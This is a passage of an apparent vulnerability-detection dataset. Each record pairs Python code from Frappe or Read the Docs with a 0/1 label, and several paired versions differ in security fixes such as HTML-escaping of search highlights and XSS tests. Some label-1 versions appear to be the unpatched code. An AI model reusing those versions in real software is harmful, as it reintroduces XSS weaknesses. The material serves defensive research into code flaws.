None\n\t\t\t\t\t\tself.db_insert()\n\t\t\t\t\t\treturn\n\n\t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e)\n\n\t\t\t\telif \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\t\t# unique constraint\n\t\t\t\t\tself.show_unique_validation_message(e)\n\t\t\t\telse:\n\t\t\t\t\traise\n\t\t\telse:\n\t\t\t\traise\n\t\tself.set(\"__islocal\", False)\n\n\tdef db_update(self):\n\t\tif self.get(\"__islocal\") or not self.name:\n\t\t\tself.db_insert()\n\t\t\treturn\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\t# don't update name, as case might've been changed\n\t\tname = d['name']\n\t\tdel d['name']\n\n\t\tcolumns = list(d)\n\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}`\n\t\t\t\tset {values} where name=%s\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tvalues = \", \".join([\"`\"+c+\"`=%s\" for c in columns])\n\t\t\t\t), list(d.values()) + [name])\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\tself.show_unique_validation_message(e)\n\t\t\telse:\n\t\t\t\traise\n\n\tdef show_unique_validation_message(self, e):\n\t\ttype, value, traceback = sys.exc_info()\n\t\tfieldname, label = str(e).split(\"'\")[-2], None\n\n\t\t# unique_first_fieldname_second_fieldname is the constraint name\n\t\t# created using frappe.db.add_unique\n\t\tif \"unique_\" in fieldname:\n\t\t\tfieldname = fieldname.split(\"_\", 1)[1]\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif df:\n\t\t\tlabel = df.label\n\n\t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname)))\n\n\t\t# this is used to preserve traceback\n\t\traise frappe.UniqueValidationError(self.doctype, self.name, e)\n\n\tdef update_modified(self):\n\t\t'''Update modified timestamp'''\n\t\tself.set(\"modified\", now())\n\t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)\n\n\tdef _fix_numeric_types(self):\n\t\tfor df in self.meta.get(\"fields\"):\n\t\t\tif df.fieldtype == \"Check\":\n\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\telif self.get(df.fieldname) is not None:\n\t\t\t\tif df.fieldtype == \"Int\":\n\t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\t\telif df.fieldtype in (\"Float\", \"Currency\", \"Percent\"):\n\t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname)))\n\n\t\tif self.docstatus is not None:\n\t\t\tself.docstatus = cint(self.docstatus)\n\n\tdef _get_missing_mandatory_fields(self):\n\t\t\"\"\"Get mandatory fields that do not have any values\"\"\"\n\t\tdef get_msg(df):\n\t\t\tif df.fieldtype == \"Table\":\n\t\t\t\treturn \"{}: {}: {}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label))\n\n\t\t\telif self.parentfield:\n\t\t\t\treturn \"{}: {} {} #{}: {}: {}\".format(_(\"Error\"), frappe.bold(_(self.doctype)),\n\t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label))\n\n\t\t\telse:\n\t\t\t\treturn _(\"Error: Value missing for {0}: {1}\").format(_(df.parent), _(df.label))\n\n\t\tmissing = []\n\n\t\tfor df in self.meta.get(\"fields\", {\"reqd\": ('=', 1)}):\n\t\t\tif self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():\n\t\t\t\tmissing.append((df.fieldname, get_msg(df)))\n\n\t\t# check for missing parent and parenttype\n\t\tif self.meta.istable:\n\t\t\tfor fieldname in (\"parent\", \"parenttype\"):\n\t\t\t\tif not self.get(fieldname):\n\t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname))))\n\n\t\treturn missing\n\n\tdef get_invalid_links(self, is_submittable=False):\n\t\t'''Returns list of invalid links and also updates fetch values if not set'''\n\t\tdef get_msg(df, docname):\n\t\t\tif self.parentfield:\n\t\t\t\treturn \"{} #{}: {}: {}\".format(_(\"Row\"), self.idx, _(df.label), docname)\n\t\t\telse:\n\t\t\t\treturn \"{}: {}\".format(_(df.label), docname)\n\n\t\tinvalid_links = []\n\t\tcancelled_links = []\n\n\t\tfor df in (self.meta.get_link_fields()\n\t\t\t\t+ self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Dynamic Link\")})):\n\t\t\tdocname = self.get(df.fieldname)\n\n\t\t\tif docname:\n\t\t\t\tif df.fieldtype==\"Link\":\n\t\t\t\t\tdoctype = df.options\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field {0}\").format(df.fieldname))\n\t\t\t\telse:\n\t\t\t\t\tdoctype = self.get(df.options)\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options)))\n\n\t\t\t\t# MySQL is case insensitive. Preserve case of the original docname in the Link Field.\n\n\t\t\t\t# get a map of values ot fetch along with this link query\n\t\t\t\t# that are mapped as link_fieldname.source_fieldname in Options of\n\t\t\t\t# Readonly or Data or Text type fields\n\n\t\t\t\tfields_to_fetch = [\n\t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname)\n\t\t\t\t\tif\n\t\t\t\t\t\tnot _df.get('fetch_if_empty')\n\t\t\t\t\t\tor (_df.get('fetch_if_empty') and not self.get(_df.fieldname))\n\t\t\t\t]\n\n\t\t\t\tif not fields_to_fetch:\n\t\t\t\t\t# cache a single value type\n\t\t\t\t\tvalues = frappe._dict(name=frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\t'name', cache=True))\n\t\t\t\telse:\n\t\t\t\t\tvalues_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]\n\t\t\t\t\t\tfor _df in fields_to_fetch]\n\n\t\t\t\t\t# don't cache if fetching other values too\n\t\t\t\t\tvalues = frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\tvalues_to_fetch, as_dict=True)\n\n\t\t\t\tif frappe.get_meta(doctype).issingle:\n\t\t\t\t\tvalues.name = doctype\n\n\t\t\t\tif values:\n\t\t\t\t\tsetattr(self, df.fieldname, values.name)\n\n\t\t\t\t\tfor _df in fields_to_fetch:\n\t\t\t\t\t\tif self.is_new() or self.docstatus != 1 or _df.allow_on_submit:\n\t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])\n\n\t\t\t\t\tnotify_link_count(doctype, docname)\n\n\t\t\t\t\tif not values.name:\n\t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\t\t\t\telif (df.fieldname != \"amended_from\"\n\t\t\t\t\t\tand (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable\n\t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2):\n\n\t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\treturn invalid_links, cancelled_links\n\n\tdef _validate_selects(self):\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\n\t\tfor df in self.meta.get_select_fields():\n\t\t\tif df.fieldname==\"naming_series\" or not (self.get(df.fieldname) and df.options):\n\t\t\t\tcontinue\n\n\t\t\toptions = (df.options or \"\").split(\"\\n\")\n\n\t\t\t# if only empty options\n\t\t\tif not filter(None, options):\n\t\t\t\tcontinue\n\n\t\t\t# strip and set\n\t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip())\n\t\t\tvalue = self.get(df.fieldname)\n\n\t\t\tif value not in options and not (frappe.flags.in_test and value.startswith(\"_T-\")):\n\t\t\t\t# show an elaborate message\n\t\t\t\tprefix = _(\"Row #{0}:\").format(self.idx) if self.get(\"parentfield\") else \"\"\n\t\t\t\tlabel = _(self.meta.get_label(df.fieldname))\n\t\t\t\tcomma_options = '\", \"'.join(_(each) for each in options)\n\n\t\t\t\tfrappe.throw(_('{0} {1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label,\n\t\t\t\t\tvalue, comma_options))\n\n\tdef _validate_constants(self):\n\t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:\n\t\t\treturn\n\n\t\tconstants = [d.fieldname for d in self.meta.get(\"fields\", {\"set_only_once\": ('=',1)})]\n\t\tif constants:\n\t\t\tvalues = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)\n\n\t\tfor fieldname in constants:\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\t# This conversion to string only when fieldtype is Date\n\t\t\tif df.fieldtype == 'Date' or df.fieldtype == 'Datetime':\n\t\t\t\tvalue = str(values.get(fieldname))\n\n\t\t\telse:\n\t\t\t\tvalue  = values.get(fieldname)\n\n\t\t\tif self.get(fieldname) != value:\n\t\t\t\tfrappe.throw(_(\"Value cannot be changed for {0}\").format(self.meta.get_label(fieldname)),\n\t\t\t\t\tfrappe.CannotChangeConstantError)\n\n\tdef _validate_length(self):\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tif self.meta.issingle:\n\t\t\t# single doctype value type is mediumtext\n\t\t\treturn\n\n\t\tcolumn_types_to_check_length = ('varchar', 'int', 'bigint')\n\n\t\tfor fieldname, value in iteritems(self.get_valid_dict()):\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\tif not df or df.fieldtype == 'Check':\n\t\t\t\t# skip standard fields and Check fields\n\t\t\t\tcontinue\n\n\t\t\tcolumn_type = type_map[df.fieldtype][0] or None\n\t\t\tdefault_column_max_length = type_map[df.fieldtype][1] or None\n\n\t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length:\n\t\t\t\tmax_length = cint(df.get(\"length\")) or cint(default_column_max_length)\n\n\t\t\t\tif len(cstr(value)) > max_length:\n\t\t\t\t\tif self.parentfield and self.idx:\n\t\t\t\t\t\treference = _(\"{0}, Row {1}\").format(_(self.doctype), self.idx)\n\n\t\t\t\t\telse:\n\t\t\t\t\t\treference = \"{0} {1}\".format(_(self.doctype), self.name)\n\n\t\t\t\t\tfrappe.throw(_(\"{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}\")\\\n\t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))\n\n\tdef _validate_update_after_submit(self):\n\t\t# get the full doc with children\n\t\tdb_values = frappe.get_doc(self.doctype, self.name).as_dict()\n\n\t\tfor key in self.as_dict():\n\t\t\tdf = self.meta.get_field(key)\n\t\t\tdb_value = db_values.get(key)\n\n\t\t\tif df and not df.allow_on_submit and (self.get(key) or db_value):\n\t\t\t\tif df.fieldtype==\"Table\":\n\t\t\t\t\t# just check if the table size has changed\n\t\t\t\t\t# individual fields will be checked in the loop for children\n\t\t\t\t\tself_value = len(self.get(key))\n\t\t\t\t\tdb_value = len(db_value)\n\n\t\t\t\telse:\n\t\t\t\t\tself_value = self.get_value(key)\n\n\t\t\t\tif self_value != db_value:\n\t\t\t\t\tfrappe.throw(_(\"Not allowed to change {0} after submission\").format(df.label),\n\t\t\t\t\t\tfrappe.UpdateAfterSubmitError)\n\n\tdef _sanitize_content(self):\n\t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS.\n\n\t\t\t- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'\n\t\t\"\"\"\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tfor fieldname, value in self.get_valid_dict().items():\n\t\t\tif not value or not isinstance(value, string_types):\n\t\t\t\tcontinue\n\n\t\t\tvalue = frappe.as_unicode(value)\n\n\t\t\tif (u\"<\" not in value and u\">\" not in value):\n\t\t\t\t# doesn't look like html so no need\n\t\t\t\tcontinue\n\n\t\t\telif \"<!-- markdown -->\" in value and not (\"<script\" in value or \"javascript:\" in value):\n\t\t\t\t# should be handled separately via the markdown converter function\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tsanitized_value = value\n\n\t\t\tif df and df.get(\"fieldtype\") in (\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\":\n\t\t\t\tsanitized_value = sanitize_email(value)\n\n\t\t\telif df and (df.get(\"ignore_xss_filter\")\n\t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n\n\t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n\t\t\t\t\t\tor self.docstatus==2\n\t\t\t\t\t\tor (self.docstatus==1 and not df.get(\"allow_on_submit\"))):\n\t\t\t\tcontinue\n\n\t\t\telse:\n\t\t\t\tsanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')\n\n\t\t\tself.set(fieldname, sanitized_value)\n\n\tdef _save_passwords(self):\n\t\t'''Save password field values in __Auth table'''\n\t\tif self.flags.ignore_save_passwords is True:\n\t\t\treturn\n\n\t\tfor df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):\n\t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue\n\t\t\tnew_password = self.get(df.fieldname)\n\t\t\tif new_password and not self.is_dummy_password(new_password):\n\t\t\t\t# is not a dummy password like '*****'\n\t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname)\n\n\t\t\t\t# set dummy password like '*****'\n\t\t\t\tself.set(df.fieldname, '*'*len(new_password))\n\n\tdef get_password(self, fieldname='password', raise_exception=True):\n\t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):\n\t\t\treturn self.get(fieldname)\n\n\t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)\n\n\tdef is_dummy_password(self, pwd):\n\t\treturn ''.join(set(pwd))=='*'\n\n\tdef precision(self, fieldname, parentfield=None):\n\t\t\"\"\"Returns float precision for a particular field (or get global default).\n\n\t\t:param fieldname: Fieldname for which precision is required.\n\t\t:param parentfield: If fieldname is in child table.\"\"\"\n\t\tfrom frappe.model.meta import get_field_precision\n\n\t\tif parentfield and not isinstance(parentfield, string_types):\n\t\t\tparentfield = parentfield.parentfield\n\n\t\tcache_key = parentfield or \"main\"\n\n\t\tif not hasattr(self, \"_precision\"):\n\t\t\tself._precision = frappe._dict()\n\n\t\tif cache_key not in self._precision:\n\t\t\tself._precision[cache_key] = frappe._dict()\n\n\t\tif fieldname not in self._precision[cache_key]:\n\t\t\tself._precision[cache_key][fieldname] = None\n\n\t\t\tdoctype = self.meta.get_field(parentfield).options if parentfield else self.doctype\n\t\t\tdf = frappe.get_meta(doctype).get_field(fieldname)\n\n\t\t\tif df.fieldtype in (\"Currency\", \"Float\", \"Percent\"):\n\t\t\t\tself._precision[cache_key][fieldname] = get_field_precision(df, self)\n\n\t\treturn self._precision[cache_key][fieldname]\n\n\n\tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):\n\t\tfrom frappe.utils.formatters import format_value\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif not df and fieldname in default_fields:\n\t\t\tfrom frappe.model.meta import get_default_df\n\t\t\tdf = get_default_df(fieldname)\n\n\t\tval = self.get(fieldname)\n\n\t\tif translated:\n\t\t\tval = _(val)\n\n\t\tif absolute_value and isinstance(val, (int, float)):\n\t\t\tval = abs(self.get(fieldname))\n\n\t\tif not doc:\n\t\t\tdoc = getattr(self, \"parent_doc\", None) or self\n\n\t\treturn format_value(val, df=df, doc=doc, currency=currency)\n\n\tdef is_print_hide(self, fieldname, df=None, for_print=True):\n\t\t\"\"\"Returns true if fieldname is to be hidden for print.\n\n\t\tPrint Hide can be set via the Print Format Builder or in the controller as a list\n\t\tof hidden fields. Example\n\n\t\t\tclass MyDoc(Document):\n\t\t\t\tdef __setup__(self):\n\t\t\t\t\tself.print_hide = [\"field1\", \"field2\"]\n\n\t\t:param fieldname: Fieldname to be checked if hidden.\n\t\t\"\"\"\n\t\tmeta_df = self.meta.get_field(fieldname)\n\t\tif meta_df and meta_df.get(\"__print_hide\"):\n\t\t\treturn True\n\n\t\tprint_hide = 0\n\n\t\tif self.get(fieldname)==0 and not self.meta.istable:\n\t\t\tprint_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )\n\n\t\tif not print_hide:\n\t\t\tif df and df.print_hide is not None:\n\t\t\t\tprint_hide = df.print_hide\n\t\t\telif meta_df:\n\t\t\t\tprint_hide = meta_df.print_hide\n\n\t\treturn print_hide\n\n\tdef in_format_data(self, fieldname):\n\t\t\"\"\"Returns True if shown via Print Format::`format_data` property.\n\t\t\tCalled from within standard print format.\"\"\"\n\t\tdoc = getattr(self, \"parent_doc\", self)\n\n\t\tif hasattr(doc, \"format_data_map\"):\n\t\t\treturn fieldname in doc.format_data_map\n\t\telse:\n\t\t\treturn True\n\n\tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):\n\t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\"\n\t\tto_reset = []\n\n\t\tfor df in high_permlevel_fields:\n\t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:\n\t\t\t\tto_reset.append(df)\n\n\t\tif to_reset:\n\t\t\tif self.is_new():\n\t\t\t\t# if new, set default value\n\t\t\t\tref_doc = frappe.new_doc(self.doctype)\n\t\t\telse:\n\t\t\t\t# get values from old doc\n\t\t\t\tif self.get('parent_doc'):\n\t\t\t\t\tself.parent_doc.get_latest()\n\t\t\t\t\tref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]\n\t\t\t\telse:\n\t\t\t\t\tref_doc = self.get_latest()\n\n\t\t\tfor df in to_reset:\n\t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname))\n\n\tdef get_value(self, fieldname):\n\t\tdf = self.meta.get_field(fieldname)\n\t\tval = self.get(fieldname)\n\n\t\treturn self.cast(val, df)\n\n\tdef cast(self, value, df):\n\t\treturn cast_fieldtype(df.fieldtype, value)\n\n\tdef _extract_images_from_text_editor(self):\n\t\tfrom frappe.utils.file_manager import extract_images_from_doc\n\t\tif self.doctype != \"DocType\":\n\t\t\tfor df in self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Text Editor\")}):\n\t\t\t\textract_images_from_doc(self, df.fieldname)\n\ndef _filter(data, filters, limit=None):\n\t\"\"\"pass filters as:\n\t\t{\"key\": \"val\", \"key\": [\"!=\", \"val\"],\n\t\t\"key\": [\"in\", \"val\"], \"key\": [\"not in\", \"val\"], \"key\": \"^val\",\n\t\t\"key\" : True (exists), \"key\": False (does not exist) }\"\"\"\n\n\tout, _filters = [], {}\n\n\tif not data:\n\t\treturn out\n\n\t# setup filters as tuples\n\tif filters:\n\t\tfor f in filters:\n\t\t\tfval = filters[f]\n\n\t\t\tif not isinstance(fval, (tuple, list)):\n\t\t\t\tif fval is True:\n\t\t\t\t\tfval = (\"not None\", fval)\n\t\t\t\telif fval is False:\n\t\t\t\t\tfval = (\"None\", fval)\n\t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"):\n\t\t\t\t\tfval = (\"^\", fval[1:])\n\t\t\t\telse:\n\t\t\t\t\tfval = (\"=\", fval)\n\n\t\t\t_filters[f] = fval\n\n\tfor d in data:\n\t\tadd = True\n\t\tfor f, fval in iteritems(_filters):\n\t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]):\n\t\t\t\tadd = False\n\t\t\t\tbreak\n\n\t\tif add:\n\t\t\tout.append(d)\n\t\t\tif limit and (len(out)-1)==limit:\n\t\t\t\tbreak\n\n\treturn out\n/n/n/n", "label": 1}, {"id": "1ebe494ffde18109307f205d2bd94102452f697a", "code": "readthedocs/search/documents.py/n/nfrom django.conf import settings\nfrom django_elasticsearch_dsl import DocType, Index, fields\nfrom elasticsearch_dsl.query import SimpleQueryString, Bool\n\nfrom readthedocs.projects.models import Project, HTMLFile\nfrom readthedocs.search.faceted_search import ProjectSearch, FileSearch\nfrom .mixins import RTDDocTypeMixin\n\nproject_conf = settings.ES_INDEXES['project']\nproject_index = Index(project_conf['name'])\nproject_index.settings(**project_conf['settings'])\n\npage_conf = settings.ES_INDEXES['page']\npage_index = Index(page_conf['name'])\npage_index.settings(**page_conf['settings'])\n\n\n@project_index.doc_type\nclass ProjectDocument(RTDDocTypeMixin, DocType):\n\n    class Meta(object):\n        model = Project\n        fields = ('name', 'slug', 'description')\n        ignore_signals = settings.ES_PROJECT_IGNORE_SIGNALS\n\n    url = fields.TextField(attr='get_absolute_url')\n    users = fields.NestedField(properties={\n        'username': fields.TextField(),\n        'id': fields.IntegerField(),\n    })\n    language = fields.KeywordField()\n\n    @classmethod\n    def faceted_search(cls, query, language=None, using=None, index=None):\n        kwargs = {\n            'using': using or cls._doc_type.using,\n            'index': index or cls._doc_type.index,\n            'doc_types': [cls],\n            'model': cls._doc_type.model,\n            'query': query\n        }\n\n        if language:\n            kwargs['filters'] = {'language': language}\n\n        return ProjectSearch(**kwargs)\n\n\n@page_index.doc_type\nclass PageDocument(RTDDocTypeMixin, DocType):\n\n    class Meta(object):\n        model = HTMLFile\n        fields = ('commit',)\n        ignore_signals = settings.ES_PAGE_IGNORE_SIGNALS\n\n    project = fields.KeywordField(attr='project.slug')\n    version = fields.KeywordField(attr='version.slug')\n\n    title = fields.TextField(attr='processed_json.title')\n    headers = fields.TextField(attr='processed_json.headers')\n    content = fields.TextField(attr='processed_json.content')\n    path = fields.KeywordField(attr='processed_json.path')\n\n    # Fields to perform search with weight\n    search_fields = ['title^10', 'headers^5', 'content']\n    # Exclude some files to not index\n    excluded_files = ['search.html', 'genindex.html', 'py-modindex.html']\n\n    @classmethod\n    def faceted_search(cls, query, projects_list=None, versions_list=None, using=None, index=None):\n        es_query = cls.get_es_query(query=query)\n        kwargs = {\n            'using': using or cls._doc_type.using,\n            'index': index or cls._doc_type.index,\n            'doc_types': [cls],\n            'model': cls._doc_type.model,\n            'query': es_query,\n            'fields': cls.search_fields\n        }\n        filters = {}\n\n        if projects_list:\n            filters['project'] = projects_list\n        if versions_list:\n            filters['version'] = versions_list\n\n        kwargs['filters'] = filters\n\n        return FileSearch(**kwargs)\n\n    @classmethod\n    def simple_search(cls, query, using=None, index=None):\n        \"\"\"\n        Do a search without facets.\n\n        This is used in:\n\n        * The Docsearch API\n        * The Project Admin Search page\n        \"\"\"\n\n        es_search = cls.search(using=using, index=index)\n        es_search = es_search.highlight_options(encoder='html')\n\n        es_query = cls.get_es_query(query=query)\n        highlighted_fields = [f.split('^', 1)[0] for f in cls.search_fields]\n        es_search = es_search.query(es_query).highlight(*highlighted_fields)\n\n        return es_search\n\n    @classmethod\n    def get_es_query(cls, query):\n        \"\"\"Return the Elasticsearch query generated from the query string\"\"\"\n        all_queries = []\n\n        # Need to search for both 'AND' and 'OR' operations\n        # The score of AND should be higher as it satisfies both OR and AND\n        for operator in ['OR']:\n            # TODO: readd this, testing removal for performance\n            # for operator in ['AND', 'OR']:\n            query_string = SimpleQueryString(query=query, fields=cls.search_fields,\n                                             default_operator=operator)\n            all_queries.append(query_string)\n\n        # Run bool query with should, so it returns result where either of the query matches\n        bool_query = Bool(should=all_queries)\n\n        return bool_query\n\n    def get_queryset(self):\n        \"\"\"Overwrite default queryset to filter certain files to index\"\"\"\n        queryset = super(PageDocument, self).get_queryset()\n\n        # Do not index files that belong to non sphinx project\n        # Also do not index certain files\n        queryset = (queryset.filter(project__documentation_type__contains='sphinx')\n                            .exclude(name__in=self.excluded_files))\n        return queryset\n/n/n/nreadthedocs/search/faceted_search.py/n/nfrom elasticsearch_dsl import FacetedSearch, TermsFacet\n\n\nclass RTDFacetedSearch(FacetedSearch):\n\n    \"\"\"Overwrite the initialization in order too meet our needs\"\"\"\n\n    # TODO: Remove the overwrite when the elastic/elasticsearch-dsl-py#916\n    # See more: https://github.com/elastic/elasticsearch-dsl-py/issues/916\n\n    def __init__(self, using, index, doc_types, model, fields=None, **kwargs):\n        self.using = using\n        self.index = index\n        self.doc_types = doc_types\n        self._model = model\n        if fields:\n            self.fields = fields\n        super(RTDFacetedSearch, self).__init__(**kwargs)\n\n\nclass ProjectSearch(RTDFacetedSearch):\n    fields = ['name^5', 'description']\n    facets = {\n        'language': TermsFacet(field='language')\n    }\n\n\nclass FileSearch(RTDFacetedSearch):\n    facets = {\n        'project': TermsFacet(field='project'),\n        'version': TermsFacet(field='version')\n    }\n\n    def query(self, search, query):\n        \"\"\"\n        Add query part to ``search``\n\n        Overriding because we pass ES Query object instead of string\n        \"\"\"\n        search = search.highlight_options(encoder='html')\n        if query:\n            search = search.query(query)\n\n        return search\n/n/n/n", "label": 0}, {"id": "1ebe494ffde18109307f205d2bd94102452f697a", "code": "/readthedocs/search/faceted_search.py/n/nfrom elasticsearch_dsl import FacetedSearch, TermsFacet\nfrom elasticsearch_dsl.query import SimpleQueryString, Bool\n\n\nclass RTDFacetedSearch(FacetedSearch):\n\n    \"\"\"Overwrite the initialization in order too meet our needs\"\"\"\n\n    # TODO: Remove the overwrite when the elastic/elasticsearch-dsl-py#916\n    # See more: https://github.com/elastic/elasticsearch-dsl-py/issues/916\n\n    def __init__(self, using, index, doc_types, model, fields=None, **kwargs):\n        self.using = using\n        self.index = index\n        self.doc_types = doc_types\n        self._model = model\n        if fields:\n            self.fields = fields\n        super(RTDFacetedSearch, self).__init__(**kwargs)\n\n\nclass ProjectSearch(RTDFacetedSearch):\n    fields = ['name^5', 'description']\n    facets = {\n        'language': TermsFacet(field='language')\n    }\n\n\nclass FileSearch(RTDFacetedSearch):\n    facets = {\n        'project': TermsFacet(field='project'),\n        'version': TermsFacet(field='version')\n    }\n\n    def query(self, search, query):\n        \"\"\"\n        Add query part to ``search``\n\n        Overriding because we pass ES Query object instead of string\n        \"\"\"\n        if query:\n            search = search.query(query)\n\n        return search\n/n/n/n", "label": 1}, {"id": "13ca0161273c368fdb6a51900a9c08917115307b", "code": "readthedocs/search/tests/test_xss.py/n/nimport pytest\n\nfrom readthedocs.search.documents import PageDocument\n\n\n@pytest.mark.django_db\n@pytest.mark.search\nclass TestXSS:\n\n    def test_facted_page_xss(self, client, project):\n        query = 'XSS'\n        page_search = PageDocument.faceted_search(query=query, user='')\n        results = page_search.execute()\n        expected = \"\"\"\n        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n        \"\"\".strip()\n\n        hits = results.hits.hits\n        assert len(hits) == 1  # there should be only one result\n\n        inner_hits = hits[0]['inner_hits']\n\n        domain_hits = inner_hits['domains']['hits']['hits']\n        assert len(domain_hits) == 0  # there shouldn't be any results from domains\n\n        section_hits = inner_hits['sections']['hits']['hits']\n        assert len(section_hits) == 1\n\n        section_content_highlight = section_hits[0]['highlight']['sections.content']\n        assert len(section_content_highlight) == 1\n\n        assert expected in section_content_highlight[0]\n/n/n/n", "label": 0}, {"id": "13ca0161273c368fdb6a51900a9c08917115307b", "code": "/readthedocs/search/tests/test_xss.py/n/nimport pytest\n\nfrom readthedocs.search.documents import PageDocument\n\n\n@pytest.mark.django_db\n@pytest.mark.search\nclass TestXSS:\n\n    def test_facted_page_xss(self, client, project):\n        query = 'XSS'\n        page_search = PageDocument.faceted_search(query=query, user='')\n        results = page_search.execute()\n        expected = \"\"\"\n        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n        \"\"\".strip()\n        assert results[0].meta.highlight.content[0][:len(expected)] == expected\n/n/n/n", "label": 1}, {"id": "ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e", "code": "readthedocs/search/tests/test_xss.py/n/nimport pytest\n\nfrom readthedocs.search.documents import PageDocument\n\n\n@pytest.mark.django_db\n@pytest.mark.search\nclass TestXSS:\n\n    def test_facted_page_xss(self, client, project):\n        query = 'XSS'\n        page_search = PageDocument.faceted_search(query=query, user='')\n        results = page_search.execute()\n        expected = \"\"\"\n        &lt;h3&gt;<span>XSS</span> exploit&lt;&#x2F;h3&gt;\n        \"\"\".strip()\n\n        hits = results.hits.hits\n        assert len(hits) == 1  # there should be only one result\n\n        inner_hits = hits[0]['inner_hits']\n\n        domain_hits = inner_hits['domains']['hits']['hits']\n        assert len(domain_hits) == 0  # there shouldn't be any results from domains\n\n        section_hits = inner_hits['sections']['hits']['hits']\n        assert len(section_hits) == 1\n\n        section_content_highlight = section_hits[0]['highlight']['sections.content']\n        assert len(section_content_highlight) == 1\n\n        assert expected in section_content_highlight[0]\n/n/n/n", "label": 0}, {"id": "ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e", "code": "/readthedocs/search/tests/test_xss.py/n/nimport pytest\n\nfrom readthedocs.search.documents import PageDocument\n\n\n@pytest.mark.django_db\n@pytest.mark.search\nclass TestXSS:\n\n    def test_facted_page_xss(self, client, project):\n        query = 'XSS'\n        page_search = PageDocument.faceted_search(query=query, user='')\n        results = page_search.execute()\n        expected = \"\"\"\n        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n        \"\"\".strip()\n\n        hits = results.hits.hits\n        assert len(hits) == 1  # there should be only one result\n\n        inner_hits = hits[0]['inner_hits']\n\n        domain_hits = inner_hits['domains']['hits']['hits']\n        assert len(domain_hits) == 0  # there shouldn't be any results from domains\n\n        section_hits = inner_hits['sections']['hits']['hits']\n        assert len(section_hits) == 1\n\n        section_content_highlight = section_hits[0]['highlight']['sections.content']\n        assert len(section_content_highlight) == 1\n\n        assert expected in section_content_highlight[0]\n/n/n/n", "label": 1}, {"id": "6641c62beaa1468082e47d82da5ed758d11c7735", "code": 